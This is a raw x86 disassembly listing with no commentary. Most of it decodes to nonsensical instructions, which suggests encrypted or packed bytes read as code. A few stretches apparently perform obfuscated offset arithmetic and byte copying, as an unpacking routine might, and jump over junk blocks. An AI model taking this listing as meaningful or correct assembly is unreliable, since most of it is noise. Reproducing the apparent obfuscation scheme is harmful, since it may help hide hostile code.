  40da39:	fcmovnb st,st(7)
  40da3b:	sub    BYTE PTR [edx-0x5c],ah
  40da3e:	mov    ds:0x2f3edaf2,al
  40da43:	sub    DWORD PTR [eax+0x67],ecx
  40da46:	pusha  
  40da47:	adc    DWORD PTR [ecx-0x3d],ebx
  40da4a:	lea    esi,[edx]
  40da4c:	loop   0x40d9cf
  40da4e:	and    edx,DWORD PTR ds:[edx]
  40da51:	sub    bl,ah
  40da53:	lock and eax,0xc7cbad61
  40da59:	inc    ecx
  40da5a:	int    0x1c
  40da5c:	pop    edx
  40da5d:	ja     0x40da3c
  40da5f:	pop    ds
  40da60:	cmp    bl,dl
  40da62:	mov    DWORD PTR [ebx-0x2e],ebp
  40da65:	fimul  DWORD PTR [eax+0x6cfe3349]
  40da6b:	inc    ebx
  40da6c:	push   ds
  40da6d:	les    esp,FWORD PTR [eax-0x7f328477]
  40da73:	sub    ch,BYTE PTR ss:[ebx+0xe]
  40da77:	aaa    
  40da78:	cdq    
  40da79:	pop    ebp
  40da7a:	mov    sp,0x40a
  40da7e:	sub    BYTE PTR [esi+0x20],cl
  40da81:	mov    esp,0xf26da98d
  40da86:	xor    eax,0xb68b67af
  40da8b:	fwait
  40da8c:	popa   
  40da8d:	pop    esp
  40da8e:	adc    cl,BYTE PTR [ecx-0x38359077]
  40da94:	shr    BYTE PTR [ecx+ecx*8-0x1f],cl
  40da98:	jecxz  0x40da85
  40da9a:	pop    ebx
  40da9b:	jno    0x40da86
  40da9d:	nop
  40da9e:	mov    dl,0xcd
  40daa0:	in     eax,0xa5
  40daa2:	xor    eax,0x55854180
  40daa7:	lods   al,BYTE PTR ds:[esi]
  40daa8:	(bad)  
  40daa9:	lods   eax,DWORD PTR ds:[esi]
  40daaa:	cld    
  40daab:	div    DWORD PTR [eax+0x16]
  40daae:	jl     0x40db27
  40dab0:	ja     0x40daad
  40dab2:	jno    0x40dac8
  40dab4:	repz fucomi st,st(7)
  40dab7:	addr16 jp 0x40da6c
  40daba:	sub    cl,BYTE PTR [eax-0x247abe76]
  40dac0:	sahf   
  40dac1:	adc    DWORD PTR [esi-0x12],esp
  40dac4:	not    ebp
  40dac6:	adc    al,0xa2
  40dac8:	fild   QWORD PTR [ebp-0x48]
  40dacb:	sti    
  40dacc:	jge    0x40daec
  40dace:	mov    al,ds:0xb63145bf
  40dad3:	pop    ds
  40dad4:	or     bh,BYTE PTR [ebx+0x5792a09e]
  40dada:	cmp    DWORD PTR [ebp+0x6fb0e384],eax
  40dae0:	push   esp
  40dae1:	mov    eax,0x138bfbd4
  40dae6:	and    DWORD PTR [ebp+0x2e],0xb2d2561b
  40daed:	jne    0x40dace
  40daef:	aam    0x17
  40daf1:	mov    ds:0x61731bd5,al
  40daf6:	jo     0x40daed
  40daf8:	mov    ds:0xaed29cf5,al
  40dafd:	bound  ecx,QWORD PTR ds:0xe61fd19d
  40db03:	pop    esi
  40db04:	call   0x13091e20
  40db09:	sar    ah,cl
  40db0b:	push   esp
  40db0c:	sub    dh,BYTE PTR [edx+ebp*8+0x3e66ed65]
  40db13:	mov    esi,0x413a0151
  40db18:	add    al,0xd5
  40db1a:	xchg   ebx,eax
  40db1b:	fsubr  DWORD PTR [edx-0x2b]
  40db1e:	mov    edx,0xa009ffe8
  40db23:	lods   eax,DWORD PTR ds:[esi]
  40db24:	mov    ebp,0x9cfb7cef
  40db29:	and    eax,0x2c2d4494
  40db2e:	call   FWORD PTR [ebx-0x2ef57380]
  40db34:	mov    cl,0x15
  40db36:	xor    ch,BYTE PTR [ecx]
  40db38:	mov    esp,DWORD PTR [esp+edx*1]
  40db3b:	cmp    dl,BYTE PTR [eax+0x25715455]
  40db41:	add    al,0xfd
  40db43:	mov    cl,BYTE PTR [ebx-0x3696f7bb]
  40db49:	add    DWORD PTR [esi],ebp
  40db4b:	add    BYTE PTR [eax],al
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40db33
  40db97:	pop    esp
  40db98:	scas   eax,DWORD PTR es:[edi]
  40db99:	mov    al,0x5b
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    BYTE PTR [ecx+0x50],dh
  40dba4:	jbe    0x40dbd7
  40dba6:	mov    ds:0xc3944f64,al
  40dbab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbac:	ja     0x40dc2b
  40dbae:	mov    ah,0x14
  40dbb0:	mov    dl,0x84
  40dbb2:	adc    edi,DWORD PTR [ebp+edi*4+0x23]
  40dbb6:	shl    DWORD PTR [ecx+0x17],1
  40dbb9:	sub    al,0x20
  40dbbb:	push   esp
  40dbbc:	call   DWORD PTR [edi+0x51]
  40dbbf:	mov    bl,0x3c
  40dbc1:	cmp    ah,BYTE PTR [ebx-0x43acf64f]
  40dbc7:	je     0x40db55
  40dbc9:	push   esi
  40dbca:	xor    DWORD PTR [esi+0x26e27360],esi
  40dbd0:	and    al,0x21
  40dbd2:	outs   dx,BYTE PTR ds:[esi]
  40dbd3:	mov    eax,0xd3e3a225
  40dbd8:	cdq    
  40dbd9:	ss dec edi
  40dbdb:	xchg   edx,eax
  40dbdc:	sub    BYTE PTR [ecx-0x558fa6a3],0x61
  40dbe3:	hlt    
  40dbe4:	ret    0xc555
  40dbe7:	das    
  40dbe8:	sahf   
  40dbe9:	ret    0x6850
  40dbec:	xchg   BYTE PTR [eax+0x5005844d],ch
  40dbf2:	fcom   DWORD PTR [edi+0x5b9fd983]
  40dbf8:	cmp    ch,ah
  40dbfa:	adc    al,0x95
  40dbfc:	pushf  
  40dbfd:	je     0x40dc06
  40dbff:	mov    esi,?
  40dc01:	in     al,dx
  40dc02:	xchg   esi,eax
  40dc03:	add    eax,0xca369dd4
  40dc08:	int3   
  40dc09:	adc    bh,BYTE PTR [ecx-0x72]
  40dc0c:	adc    al,ch
  40dc0e:	in     eax,dx
  40dc0f:	dec    edx
  40dc10:	xchg   esp,eax
  40dc11:	add    DWORD PTR [eax-0x2c224dc0],ebp
  40dc17:	cmp    al,0x76
  40dc19:	jl     0x40dc83
  40dc1b:	push   0xd77b7037
  40dc20:	sbb    eax,0xaf2c0f6f
  40dc25:	icebp  
  40dc26:	or     ebx,eax
  40dc28:	addr16 pop esp
  40dc2a:	in     eax,dx
  40dc2b:	dec    edx
  40dc2c:	out    0xc0,al
  40dc2e:	jmp    0x8211:0xf86492a4
  40dc35:	loop   0x40dc02
  40dc37:	shl    ch,1
  40dc39:	mov    cl,0xe6
  40dc3b:	lahf   
  40dc3c:	xchg   esp,eax
  40dc3d:	stc    
  40dc3e:	div    BYTE PTR [ebx-0x47]
  40dc41:	or     al,0x48
  40dc43:	mov    esi,0x21b8a88f
  40dc48:	test   eax,0x60a00cf6
  40dc4d:	inc    ecx
  40dc4e:	sub    eax,edx
  40dc50:	jns    0x40dbe6
  40dc52:	mov    gs,WORD PTR [esi+0x28]
  40dc55:	push   ebx
  40dc56:	stos   DWORD PTR es:[edi],eax
  40dc57:	inc    edi
  40dc58:	sub    DWORD PTR [edi-0x16b13f19],ecx
  40dc5e:	xor    ch,BYTE PTR [esi+0x5b]
  40dc61:	xor    BYTE PTR [esi+0x6e05e77d],ah
  40dc67:	outs   dx,BYTE PTR ds:[esi]
  40dc68:	ins    DWORD PTR es:[edi],dx
  40dc69:	in     eax,dx
  40dc6a:	xchg   esi,eax
  40dc6b:	inc    DWORD PTR [edx+0x36a4f89]
  40dc71:	and    al,0x10
  40dc73:	fmulp  st(4),st
  40dc75:	aad    0x59
  40dc77:	dec    edx
  40dc78:	mov    ah,0x99
  40dc7a:	pop    edi
  40dc7b:	jnp    0x40dc82
  40dc7d:	lock push ds
  40dc7f:	or     BYTE PTR [eax-0x643ad537],ah
  40dc85:	push   esp
  40dc86:	clc    
  40dc87:	loopne 0x40dce1
  40dc89:	or     eax,0x6e0c5204
  40dc8e:	sbb    eax,0xbcb9c376
  40dc93:	adc    BYTE PTR [ebp+0x6089b6da],dl
  40dc99:	inc    eax
  40dc9a:	pushf  
  40dc9b:	xor    eax,0x2158deba
  40dca0:	sti    
  40dca1:	or     DWORD PTR [edi-0x13],0xcc466680
  40dca8:	and    eax,0x83f49c9d
  40dcad:	mov    esi,0xfd60494a
  40dcb2:	aam    0x1
  40dcb4:	pushf  
  40dcb5:	or     esp,DWORD PTR [eax+0x1edbb902]
  40dcbb:	xor    eax,0xfbdf7a6
  40dcc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcc2:	(bad)  
  40dcc4:	int    0xc3
  40dcc6:	xchg   esp,eax
  40dcc7:	add    esi,DWORD PTR [esi+0x6f61f37c]
  40dccd:	pushf  
  40dcce:	and    edx,DWORD PTR [ebx-0x33]
  40dcd1:	cdq    
  40dcd2:	rcl    BYTE PTR [edx+0xa8672a9],1
  40dcd8:	sub    al,0xa
  40dcda:	and    al,0x15
  40dcdc:	jp     0x40dd37
  40dcde:	push   esi
  40dcdf:	(bad)  
  40dce1:	shl    DWORD PTR [ecx],1
  40dce3:	outs   dx,DWORD PTR fs:[esi]
  40dce5:	cwde   
  40dce6:	xchg   edi,eax
  40dce7:	inc    eax
  40dce8:	ror    DWORD PTR [ebp+edx*8-0x7f1446e8],1
  40dcef:	(bad)  
  40dcf0:	fsub   st,st(3)
  40dcf2:	hlt    
  40dcf3:	sub    al,0x21
  40dcf5:	or     al,0xad
  40dcf7:	aad    0x96
  40dcf9:	sbb    cl,BYTE PTR [eax]
  40dcfb:	jecxz  0x40dc8f
  40dcfd:	scas   al,BYTE PTR es:[edi]
  40dcfe:	xchg   ebx,eax
  40dcff:	hlt    
  40dd00:	mov    ecx,0x60003370
  40dd05:	fistp  DWORD PTR [edx+0x3daf9dcc]
  40dd0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd0c:	dec    esi
  40dd0d:	xor    al,bl
  40dd0f:	(bad)  
  40dd10:	mov    cl,0x38
  40dd12:	aaa    
  40dd13:	and    al,0x44
  40dd15:	(bad)  
  40dd16:	pusha  
  40dd17:	push   0x6fda48c0
  40dd1c:	dec    eax
  40dd1d:	add    BYTE PTR [eax+0x151301ff],ch
  40dd23:	stos   BYTE PTR es:[edi],al
  40dd24:	jnp    0x40dd91
  40dd26:	dec    ecx
  40dd27:	dec    esp
  40dd28:	stos   DWORD PTR es:[edi],eax
  40dd29:	lods   al,BYTE PTR ds:[esi]
  40dd2a:	in     al,dx
  40dd2b:	cmp    eax,0x2a1ec6a9
  40dd30:	xor    eax,DWORD PTR [edi]
  40dd32:	jb     0x40dd90
  40dd34:	stos   DWORD PTR es:[edi],eax
  40dd35:	xor    eax,0xe8dbf6a9
  40dd3a:	adc    al,0x5a
  40dd3c:	jle    0x40dd31
  40dd3e:	xor    al,BYTE PTR [esi-0x65512b8b]
  40dd44:	imul   DWORD PTR [eax-0x530f53c8]
  40dd4a:	rcl    DWORD PTR [esi-0x26],cl
  40dd4d:	jmp    0xfc5e:0xab542f68
  40dd54:	neg    BYTE PTR [ebx]
  40dd56:	cmp    al,0xe9
  40dd58:	ds mov cl,0x83
  40dd5b:	cmc    
  40dd5c:	dec    esp
  40dd5d:	into   
  40dd5e:	je     0x40dd84
  40dd60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd61:	add    eax,0xfa76cf1a
  40dd66:	jns    0x40dd58
  40dd68:	inc    esp
  40dd69:	stos   BYTE PTR es:[edi],al
  40dd6a:	stos   BYTE PTR es:[edi],al
  40dd6b:	dec    esi
  40dd6c:	or     DWORD PTR [edx+0xdc745f4],0x60
  40dd73:	call   0xbbb0cf8e
  40dd78:	gs push ecx
  40dd7a:	sbb    al,0x0
  40dd7c:	fisttp QWORD PTR [di-0x42]
  40dd80:	jge    0x40ddb5
  40dd82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd83:	loope  0x40dd6a
  40dd85:	mov    BYTE PTR [eax+0x4a3bf97c],dl
  40dd8b:	(bad)  
  40dd8c:	gs (bad) 
  40dd8e:	xor    al,0x4
  40dd90:	int3   
  40dd91:	inc    ebp
  40dd92:	sbb    eax,ebp
  40dd94:	jmp    DWORD PTR [ebx-0x11307ede]
  40dd9a:	(bad)  
  40dd9c:	popa   
  40dd9d:	into   
  40dd9e:	aam    0xa7
  40dda0:	mov    eax,0x1e8307d1
  40dda5:	das    
  40dda6:	out    0xf2,al
  40dda8:	and    DWORD PTR [ebx],0xc
  40ddab:	mov    ecx,0x16e61fb8
  40ddb0:	call   FWORD PTR [edi-0xbf81333]
  40ddb6:	icebp  
  40ddb7:	call   0x815f00ab
  40ddbc:	add    BYTE PTR [edx+0x192c99a1],al
  40ddc2:	and    eax,0x7ab61e9c
  40ddc7:	cmp    dl,BYTE PTR [ecx+0x5]
  40ddca:	dec    esp
  40ddcb:	sbb    eax,0xc9bb1586
  40ddd0:	lahf   
  40ddd1:	xchg   esp,eax
  40ddd2:	fyl2xp1 
  40ddd4:	stos   BYTE PTR es:[edi],al
  40ddd5:	mov    ah,0xbb
  40ddd7:	in     eax,dx
  40ddd8:	jp     0x40dd86
  40ddda:	sar    esi,0x60
  40dddd:	sbb    eax,0xae41ae5a
  40dde2:	hlt    
  40dde3:	mov    ebp,0xc7fcd22
  40dde8:	addr16 pop ebx
  40ddea:	pop    esi
  40ddeb:	pusha  
  40ddec:	dec    esi
  40dded:	(bad)  
  40ddee:	sub    al,0xd9
  40ddf0:	imul   esp,ecx,0x1b
  40ddf3:	arpl   WORD PTR [ecx-0xf],dx
  40ddf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddf7:	std    
  40ddf8:	push   0xffffffbb
  40ddfa:	sbb    edi,DWORD PTR [ecx-0x2fce7be0]
  40de00:	sbb    DWORD PTR [edi+eiz*8],0x1d
  40de04:	or     edi,DWORD PTR [edi+0x3a]
  40de07:	es push 0xa4e52194
  40de0d:	mov    dh,BYTE PTR [ecx+0x2c]
  40de10:	into   
  40de11:	fcom   DWORD PTR [eax+0x45]
  40de14:	pushf  
  40de15:	add    BYTE PTR [edx-0xa],cl
  40de18:	jle    0x40de8c
  40de1a:	out    0xc5,eax
  40de1c:	mov    ebp,DWORD PTR [eax]
  40de1e:	jb     0x40de6c
  40de20:	xor    eax,0x5cc76a02
  40de25:	loop   0x40dde7
  40de27:	popa   
  40de28:	cmp    ecx,DWORD PTR [eax]
  40de2a:	jns    0x40de08
  40de2c:	dec    esi
  40de2d:	neg    DWORD PTR [eax]
  40de2f:	call   0x55e1:0x74397ba5
  40de36:	stc    
  40de37:	and    esp,DWORD PTR [ecx*8-0x18062deb]
  40de3e:	call   0x135c10a0
  40de43:	dec    ebp
  40de44:	xor    eax,0xe0b70d05
  40de49:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40de50:	mov    DWORD PTR [ebp-0x14],0x13cd
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422548
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40de5d
  40deca:	dec    edx
  40decb:	in     eax,0xaa
  40decd:	adc    al,0xcc
  40decf:	sbb    BYTE PTR [eax],bl
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    al,bl
  40ded6:	adc    bh,BYTE PTR [edi]
  40ded8:	sub    ebx,ebx
  40deda:	dec    esp
  40dedb:	int    0xc4
  40dedd:	cdq    
  40dede:	mov    WORD PTR [edx-0x65],ss
  40dee1:	sub    al,0xe1
  40dee3:	or     al,0xdf
  40dee5:	sbb    eax,0x6cd7dfe4
  40deea:	arpl   WORD PTR [ecx],dx
  40deec:	inc    ebx
  40deed:	nop
  40deee:	dec    ecx
  40deef:	out    dx,al
  40def0:	jmp    0xf762c012
  40def5:	test   esi,ebp
  40def7:	or     BYTE PTR [eax],al
  40def9:	pop    edx
  40defa:	or     al,0x4
  40defc:	sbb    al,0x8d
  40defe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deff:	test   BYTE PTR [edi+0x515fece7],0xd6
  40df06:	loop   0x40debd
  40df08:	mov    bl,0x84
  40df0a:	jge    0x40df2d
  40df0c:	imul   eax,DWORD PTR ds:0xbd7e0d76,0x763cea
  40df16:	test   al,0x30
  40df18:	(bad)  
  40df19:	fst    DWORD PTR [edx-0x8ce979a]
  40df1f:	adc    BYTE PTR [eax],dl
  40df21:	cli    
  40df22:	mov    gs,edx
  40df24:	scas   eax,DWORD PTR es:[edi]
  40df25:	loope  0x40df7b
  40df27:	adc    edx,DWORD PTR [edi-0x33]
  40df2a:	jmp    DWORD PTR ds:0xd3832306
  40df30:	jno    0x40df41
  40df32:	loope  0x40defc
  40df34:	into   
  40df35:	stos   BYTE PTR es:[edi],al
  40df36:	fwait
  40df37:	adc    bh,BYTE PTR [edi-0x3ee90000]
  40df3d:	aad    0xd7
  40df3f:	mov    edi,0x801a1957
  40df44:	cmc    
  40df45:	jg     0x40df68
  40df47:	out    dx,eax
  40df48:	jle    0x40df8d
  40df4a:	inc    edx
  40df4b:	outs   dx,DWORD PTR ds:[esi]
  40df4c:	jo     0x40df6d
  40df4e:	jno    0x40df7c
  40df50:	sbb    esp,DWORD PTR [ecx]
  40df52:	xlat   BYTE PTR ds:[ebx]
  40df53:	pop    edx
  40df54:	xor    esp,DWORD PTR [esi+0x2004d69]
  40df5a:	jno    0x40df69
  40df5c:	fistp  QWORD PTR [ebx+0x77]
  40df5f:	out    dx,eax
  40df60:	outs   dx,DWORD PTR ds:[esi]
  40df61:	pop    ebp
  40df62:	into   
  40df63:	test   DWORD PTR [ebx-0x7f],edi
  40df66:	repz repnz arpl WORD PTR [ebp+0x6d],ax
  40df6b:	and    eax,0xab32882
  40df70:	jmp    0x40dfa4
  40df72:	mov    ebp,0x203802a5
  40df77:	sbb    eax,0xa573a35a
  40df7c:	mov    eax,ds:0xc1211bea
  40df81:	repnz mov al,ds:0x9abd21c8
  40df87:	retf   0x44a4
  40df8a:	int3   
  40df8b:	clc    
  40df8c:	push   edi
  40df8d:	add    ah,BYTE PTR [ebp+0x3781f5b2]
  40df93:	stc    
  40df94:	pop    esi
  40df95:	pusha  
  40df96:	sub    BYTE PTR [esi],0x5d
  40df99:	fstp   st(2)
  40df9b:	lea    esi,[edi]
  40df9d:	pop    ss
  40df9e:	push   ss
  40df9f:	jle    0x40dfc3
  40dfa1:	cwde   
  40dfa2:	add    eax,0x6f857833
  40dfa7:	push   ecx
  40dfa8:	xchg   ebx,eax
  40dfa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfaa:	push   0xffffffac
  40dfac:	outs   dx,BYTE PTR ds:[esi]
  40dfad:	dec    ecx
  40dfae:	cmp    al,0xb0
  40dfb0:	dec    edx
  40dfb1:	(bad)  
  40dfb2:	stc    
  40dfb3:	scas   eax,DWORD PTR es:[edi]
  40dfb4:	fs adc eax,0x4728b6b9
  40dfba:	jmp    0xeb73:0xa9e382e3
  40dfc1:	dec    eax
  40dfc2:	clc    
  40dfc3:	and    BYTE PTR ds:0xd979e42b,bl
  40dfc9:	xchg   ebx,eax
  40dfca:	mov    edi,0x2317b877
  40dfcf:	add    eax,0x25c68ab3
  40dfd4:	ins    DWORD PTR es:[edi],dx
  40dfd5:	lods   al,BYTE PTR ds:[esi]
  40dfd6:	test   eax,0xccf21580
  40dfdb:	ss and al,0xdf
  40dfde:	sar    BYTE PTR [ebx],0xd3
  40dfe1:	mov    edi,0x206d2470
  40dfe6:	dec    ecx
  40dfe7:	cmc    
  40dfe8:	xor    bh,BYTE PTR [edi+eax*8-0x7c]
  40dfec:	add    al,0xa4
  40dfee:	pop    edi
  40dfef:	jle    0x40e009
  40dff1:	popf   
  40dff2:	mov    ch,0x6d
  40dff4:	xchg   esp,eax
  40dff5:	lock std 
  40dff7:	js     0x40e00a
  40dff9:	or     edx,DWORD PTR [ecx]
  40dffb:	mov    cl,0xf5
  40dffd:	lock out dx,eax
  40dfff:	dec    esp
  40e000:	push   ss
  40e001:	push   esi
  40e002:	cmp    DWORD PTR [eax],esp
  40e004:	pop    ds
  40e005:	and    BYTE PTR [ebp+0x2e],bh
  40e008:	inc    esi
  40e009:	shl    BYTE PTR [eax],0x5b
  40e00c:	or     al,0xa5
  40e00e:	lods   al,BYTE PTR ds:[esi]
  40e00f:	mov    eax,0x2d7a0cca
  40e014:	add    eax,0x20a25b5
  40e019:	gs es mov ecx,0x3d0b0026
  40e020:	sbb    eax,0x970c42e7
  40e025:	add    dl,bh
  40e027:	mov    esi,0x5e96c2eb
  40e02c:	stos   BYTE PTR es:[edi],al
  40e02d:	retf   0x719f
  40e030:	inc    ebp
  40e031:	and    DWORD PTR [eax-0x7e82b4fd],esp
  40e037:	das    
  40e038:	ja     0x40e04d
  40e03a:	mov    edi,0x84c66897
  40e03f:	mov    edx,0x606c1048
  40e044:	and    eax,0x436438a9
  40e049:	cmp    esi,DWORD PTR [ecx-0x45]
  40e04c:	pop    esp
  40e04d:	xchg   esp,eax
  40e04e:	xor    BYTE PTR [edi+0x2341cecd],dl
  40e054:	retf   
  40e055:	daa    
  40e056:	mov    al,0xb2
  40e058:	xor    dh,bh
  40e05a:	cmp    ecx,0x3e5b46b7
  40e060:	inc    ebp
  40e061:	loope  0x40e038
  40e063:	dec    eax
  40e064:	mov    ebx,0x36896aaa
  40e069:	push   ds
  40e06a:	push   edi
  40e06b:	cmp    al,0xb9
  40e06d:	pop    ecx
  40e06e:	mov    edx,0xa1674a5c
  40e073:	clc    
  40e074:	bound  edx,QWORD PTR [ebp+0x18]
  40e077:	fadd   QWORD PTR [edi+0x2b]
  40e07a:	push   ds
  40e07b:	push   ss
  40e07c:	cmp    eax,0xba96c7ba
  40e081:	pop    ebp
  40e082:	add    DWORD PTR [ebx+esi*2-0x2e849c65],0x63
  40e08a:	call   0x4669:0x896b19dd
  40e091:	xor    BYTE PTR [edi],cl
  40e093:	call   0x18c4a944
  40e098:	fimul  DWORD PTR [esi+0x2a]
  40e09b:	aas    
  40e09c:	add    al,0xbf
  40e09e:	retf   0x5875
  40e0a1:	in     al,0x61
  40e0a3:	fs cmp edi,DWORD PTR fs:[ebp-0x20]
  40e0a8:	test   DWORD PTR fs:[ebx-0x57],0xfa8bfca3
  40e0b0:	out    dx,eax
  40e0b1:	iret   
  40e0b2:	dec    ebx
  40e0b3:	data16 clc 
  40e0b5:	loopne 0x40e0e1
  40e0b7:	or     ecx,DWORD PTR [esi]
  40e0b9:	ins    DWORD PTR es:[edi],dx
  40e0ba:	fs (bad) 
  40e0bc:	iret   
  40e0bd:	pop    ebp
  40e0be:	je     0x40e0cc
  40e0c0:	ficom  DWORD PTR [edx+0x62]
  40e0c3:	stos   BYTE PTR es:[edi],al
  40e0c4:	push   0x703d1c15
  40e0c9:	jecxz  0x40e08b
  40e0cb:	mov    edx,0xb8a73594
  40e0d0:	fxch   st(4)
  40e0d2:	jp     0x40e13f
  40e0d4:	pop    edx
  40e0d5:	adc    BYTE PTR [eax-0x58],0xbf
  40e0d9:	sti    
  40e0da:	test   esp,ebx
  40e0dc:	sti    
  40e0dd:	xor    BYTE PTR [edi+0x63fbbaad],cl
  40e0e3:	fmul   DWORD PTR [eax-0x22]
  40e0e6:	mov    cl,0x7f
  40e0e8:	xchg   DWORD PTR [ebx+esi*2+0x2c71eae],edx
  40e0ef:	js     0x40e146
  40e0f1:	lods   eax,DWORD PTR ds:[esi]
  40e0f2:	jbe    0x40e07b
  40e0f4:	jmp    0x4e432fe1
  40e0f9:	sub    bh,ch
  40e0fb:	add    al,ah
  40e0fd:	call   0x28f7fd09
  40e102:	fcom   QWORD PTR [ebx+0x4aa085f1]
  40e108:	or     al,cl
  40e10a:	std    
  40e10b:	cs cmp al,0xe4
  40e10e:	sub    cl,BYTE PTR [ebp-0x45]
  40e111:	test   ah,bh
  40e113:	xor    ebx,edi
  40e115:	and    DWORD PTR [esi-0x3f7a38cc],ebp
  40e11b:	sub    eax,ebp
  40e11d:	shl    BYTE PTR [esi+0x4a2c2017],cl
  40e123:	cdq    
  40e124:	jae    0x40e0ac
  40e126:	ret    
  40e127:	adc    dh,BYTE PTR [esi-0x8]
  40e12a:	inc    esi
  40e12b:	stos   DWORD PTR es:[edi],eax
  40e12c:	aad    0x11
  40e12e:	sub    eax,0x7e1a8147
  40e133:	test   al,0x83
  40e135:	fiadd  WORD PTR [ecx+0x58]
  40e138:	mul    DWORD PTR [edx]
  40e13a:	add    BYTE PTR [edi-0x604bf855],bl
  40e140:	lods   eax,DWORD PTR ds:[esi]
  40e141:	test   BYTE PTR [ebp+0x6b48928b],ch
  40e147:	mov    dl,0x41
  40e149:	push   ebp
  40e14a:	xchg   ecx,eax
  40e14b:	mov    ecx,0x1adae7b4
  40e150:	fcomi  st,st(1)
  40e152:	xchg   BYTE PTR [edx-0xb9d532],al
  40e158:	add    al,BYTE PTR [esp+edi*2+0x30]
  40e15c:	mov    al,ds:0xfaf75796
  40e161:	push   eax
  40e162:	and    bh,BYTE PTR [edx+ecx*4]
  40e165:	jmp    0x40e1e6
  40e167:	in     al,dx
  40e168:	cmp    dh,BYTE PTR [ebx-0x23]
  40e16b:	mov    esp,0x9e30e1a8
  40e170:	sub    al,0x91
  40e172:	ja     0x40e16a
  40e174:	push   cs
  40e175:	jge    0x40e1b5
  40e177:	cmovo  edx,DWORD PTR [ebp+0x458baea5]
  40e17e:	lock xor eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e14c
  40e199:	sbb    BYTE PTR [ebp+0x18c8ce7c],al
  40e19f:	sbb    dl,dl
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    BYTE PTR [edi-0x24],dl
  40e1a6:	mov    ebp,0xa492b7de
  40e1ab:	and    BYTE PTR [ebx-0x33],bh
  40e1ae:	inc    edx
  40e1af:	call   0x1792:0x1c685177
  40e1b6:	popf   
  40e1b7:	retf   0x8745
  40e1ba:	inc    ecx
  40e1bb:	cmc    
  40e1bc:	ds std 
  40e1be:	pushf  
  40e1bf:	mov    dl,0xb3
  40e1c1:	rol    BYTE PTR [ecx-0x5eff0c10],cl
  40e1c7:	loopne 0x40e194
  40e1c9:	mov    eax,DWORD PTR [ecx-0x22]
  40e1cc:	pop    esp
  40e1cd:	lahf   
  40e1ce:	sbb    BYTE PTR [edx+0x70fccfc],bh
  40e1d4:	or     al,0x87
  40e1d6:	xchg   ebx,eax
  40e1d7:	in     eax,dx
  40e1d8:	xchg   DWORD PTR ds:0xa13e9e6,esi
  40e1de:	mov    bl,BYTE PTR [edi-0x18e63555]
  40e1e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1e5:	xchg   BYTE PTR [ebx+0x28],dh
  40e1e8:	sub    DWORD PTR [ecx-0x24],ebp
  40e1eb:	div    BYTE PTR [eax+0xb]
  40e1ee:	sbb    BYTE PTR [esi+ebx*1+0x27],bl
  40e1f2:	push   es
  40e1f3:	jp     0x40e21e
  40e1f5:	xchg   BYTE PTR [ebx],ch
  40e1f7:	sbb    DWORD PTR [edx],0x2f
  40e1fa:	sbb    al,BYTE PTR [edi]
  40e1fc:	je     0x40e1ee
  40e1fe:	or     eax,0xc5eb53a5
  40e203:	push   ss
  40e204:	mov    ebp,?
  40e206:	jmp    0x60fe:0x432395fb
